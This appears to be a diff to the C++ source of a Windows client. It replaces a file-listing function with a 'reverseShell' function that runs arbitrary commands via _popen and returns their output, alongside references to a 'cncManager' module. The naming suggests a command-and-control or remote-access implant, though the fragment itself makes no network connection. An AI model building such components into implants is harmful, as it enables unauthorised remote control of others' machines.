@@ -3,20 +3,26 @@
 #include <ole2.h>
 #include <olectl.h>
 #include "commandManager.h"
-#include "cncManager.h"
 #include "DDproto.h"
 
-// ls ±¸Çö¿ë
-void commandManager::getFilelist(LPCWSTR path) {
-    WIN32_FIND_DATA data;
-    HANDLE hFind = FindFirstFileW(L"C:\\*", &data);      
+commandManager::commandManager() {
+}
 
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            std::wcout << data.cFileName << std::endl;
-        } while (FindNextFile(hFind, &data));
-        FindClose(hFind);
+std::string commandManager::reverseShell(const char * cmd) {
+    char buffer[128];
+    std::string result = "";
+    FILE* pipe = _popen(cmd, "r");
+    if (!pipe) throw std::runtime_error("popen() failed!");
+    try {
+        while (fgets(buffer, sizeof(buffer), pipe) != NULL)
+            result += buffer;
     }
+    catch (...) {
+        _pclose(pipe);
+        throw;
+    }
+    _pclose(pipe);
+    return result;
 }
 
 
